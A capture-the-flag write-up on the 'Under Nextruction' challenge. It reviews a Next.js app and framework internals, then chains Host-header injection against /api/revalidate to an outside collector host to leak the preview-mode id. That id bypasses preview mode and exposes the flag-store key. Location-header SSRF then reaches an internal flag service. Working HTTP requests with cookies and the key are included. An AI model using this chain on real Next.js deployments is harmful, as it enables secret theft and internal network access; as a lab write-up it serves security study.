---
tags: 
references:
---
# Under Nextruction
Solves: 
Tags: #nextjs #header-injection #ssrf
## Road to flag
Given from the flag service
```python
@app.get("/get_flag")
def get_flag():
	if request.headers.get("X-Key") != environ.get("FLAG_STORE_KEY", "FAKE_KEY"):
		return jsonify({ "error": "Invalid X-Key value provided!" }, 403)

	return jsonify({ "flag": environ.get("FLAG") })

app.run("0.0.0.0", 5000)
```
## Code review
- In `next.config.js`, `trustHostHeader` is set
```js
const nextConfig =  {
	experimental: {
		trustHostHeader: true
	}
};
```
- `middleware.js`
```js
export async function middleware(request) {
	const parsedUrl = new URL(request.url);

	const sessionValue  = request.cookies.get("session")?.value;
	const verifiedSession = await verify(sessionValue);
	if ((!sessionValue || !verifiedSession) && parsedUrl.pathname !== "/login") {
		return NextResponse.redirect(new URL(`${baseUrl}/login`, request.url));
	}

	if (parsedUrl.pathname.startsWith("/api/")) {
		const requestHeaders = new Headers(request.headers);
		requestHeaders.set("X-User", verifiedSession.username);
		return NextResponse.next({ headers: requestHeaders });
	}
	return NextResponse.next();
}
```

- `user.js` - returns the flag store key if preview mode is enabled
```js
export default function handler(req, res) {
	if (!req.preview) {
		return res.status(403).json({
			error: "Must be in preview mode.",
			timestamp: new Date().toISOString(),
		});
	}
	const username = req.headers["x-user"];

	return res.status(200).json({
		username: username || null,
		timestamp: new Date().toISOString(),
		flagStoreKey: process.env.FLAG_STORE_KEY || "FAKE_KEY"
	});
}
```

- `/api/revalidate`
```js
export default async function handler(req, res) {
	try {
		await res.revalidate("/");

		return res.status(200).json({
			revalidated: true,
			timestamp: new Date().toISOString(),
			message: "Cache revalidated successfully",
		});
	} catch (err) {
		return res.status(500).json({
			revalidated: false,
			message: "Error revalidating cache",
			error: err.message,
		});
	}
}
```

### Next internals
- preview mode is set when the cookie `__prerender_bypass` is present with a valid value:
```js
const previewModeId = cookies.get('__prerender_bypass')?.value
const tokenPreviewData = cookies.get('__next_preview_data')?.value

// Case: preview mode cookie set but data cookie is not set
if (
	previewModeId &&
	!tokenPreviewData &&
	previewModeId === options.previewModeId
) {
	// This is "Draft Mode" which doesn't use
	// previewData, so we return an empty object
	// for backwards compat with "Preview Mode".
	const data = {}
	Object.defineProperty(req, SYMBOL_PREVIEW_DATA, {
		value: data,
		enumerable: false,
	})
	return data
}
```

- `revalidate` function: `previewModeId` leak
```js
async function revalidate(
  urlPath: string,
  opts: {
    unstable_onlyGenerated?: boolean
  },
  req: IncomingMessage,
  context: ApiContext
) {
  if (typeof urlPath !== 'string' || !urlPath.startsWith('/')) {
    throw new Error(
      `Invalid urlPath provided to revalidate(), must be a path e.g. /blog/post-1, received ${urlPath}`
    )
  }
  const revalidateHeaders: HeadersInit = {
    [PRERENDER_REVALIDATE_HEADER]: context.previewModeId,
    ...(opts.unstable_onlyGenerated
      ? {
          [PRERENDER_REVALIDATE_ONLY_GENERATED_HEADER]: '1',
        }
      : {}),
	}
	[...]

    if (context.trustHostHeader) {
      const res = await fetch(`https://${req.headers.host}${urlPath}`, {
        method: 'HEAD',
        headers: revalidateHeaders,
      })
```

## Exploitation

1. Getting the register next action id:
   The register route doesn't exist but a register action is present in the code.
   `/_next/static/chunks/app/login/page-0ca7abb07c5ac87c.js` shows the next actions id
```js
(0,l.createServerReference)("60fe59b2a3a5332a04013be125ebf9272e33e0a922",l.callServer,void 0,l.findSourceMapURL,
```

2. Enable preview mode to get the flag service key
	  - get preview mode id `GET /api/revalidate HTTP/1.1\r\nHost: cc426f7n.requestrepo.com`
	  - get flag store key: just add `__prerender_bypass=ID` to the cookies for the request to `/api/user`

3. SSRF to get the flag
   Set `Location: http://under-nextruction-flag:5000/get_flag` in the request, the header will be reflected in the response and the redirect will be triggered.
```http
GET /api/user HTTP/2
Host: cc426f7n.requestrepo.com
X-Key: 8fce97b0137965a3ddd635355eb3b1d249844c814c7981ade10dc201a329b457
Location: http://under-nextruction-flag:5000/get_flag
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFmcXdlZmV3cmdlcndmZXJ3ZndyZSIsImlhdCI6MTc0NTE5MzkyMCwiZXhwIjoxNzQ1MjgwMzIwfQ.Ozle6otMW5nTmPYlTke2gSWmmlmwltmt9U1bT-CMuIw; __prerender_bypass=59c6709a1c2b39386a72b0026399960b


```

`FCSC{b2eac9d3dfbf0de3053beb63edec23df41b103c58a18b811ebd52d372d6f0cad}`